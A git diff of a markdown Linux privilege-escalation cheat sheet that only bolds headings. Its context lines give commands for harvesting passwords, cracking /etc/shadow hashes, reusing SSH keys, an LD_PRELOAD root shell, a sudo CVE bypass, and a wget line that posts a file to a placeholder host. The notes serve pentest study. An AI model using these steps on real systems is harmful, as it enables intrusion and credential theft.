@@ -61,7 +61,7 @@
 - Search for the keyword password
 	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
 
-Escalation via Weak File Permissions
+**Escalation via Weak File Permissions**
 - View the read permission on /etc/shadow and /etc/passwd.
 - If a user have read permission on both of the file.
 - Copy the data from both file and save separately.
@@ -71,7 +71,7 @@ Escalation via Weak File Permissions
 - Use Hashcat to decrypt the passwords.
 	- `hashcat -m 1800 unshadow.txt rockyou.txt`
 
-Escalation via SSH Keys
+**Escalation via SSH Keys**
 - Enumerate id rsa (Private Key).
 	- `find / -name id_rsa 2> /dev/null`
 	- `chmod 600 id_rsa`
@@ -91,7 +91,7 @@ Escalation via SSH Keys
 	- `ssh username@IP`
 
 ## Escalation Path: Sudo
-Escalation via Sudo Shell Escaping
+**Escalation via Sudo Shell Escaping**
 - `sudo -l`
 - It will list the application or services which can be root as sudo or whether it needs password to run or not.
 - Navigate to GTFOBins and search for an application name.
@@ -109,7 +109,7 @@ Escalation via Intended Functionality
 	- Send wget commands as such:
 		- `sudo wget -post-file=<filename> <ip><port>`
 
-Escalation via LD_PRELOAD
+**Escalation via LD_PRELOAD**
 - `sudo -l`
 	- We can see the environment variable LD_PRELOAD
 	- It is a feature of dynamic linker (LD) which is used for preloading the library.
@@ -130,14 +130,14 @@ void_init(){
 - `sudo LD_PRELOAD=/full/path/shell.so <appname>`
 	- Where appname is an ouput of app list from `sudo -l`
 
-Escalation via CVE-2019-14287
+**Escalation via CVE-2019-14287**
 - Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id.
 - If we found `username ALL=(ALL:!root) /bin/bash`
 - We can escalate the privilege with following:
 	- `sudo -u#-1 /bin/bash`
 - References: https://www.exploit-db.com/exploits/47502
 
-Escalation via CVE-2019-18634
+**Escalation via CVE-2019-18634**
 - In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process.
 - This bug can be triggered even by users not listed in the sudoers file.
 - There is no impact unless pwfeedback has been enabled.
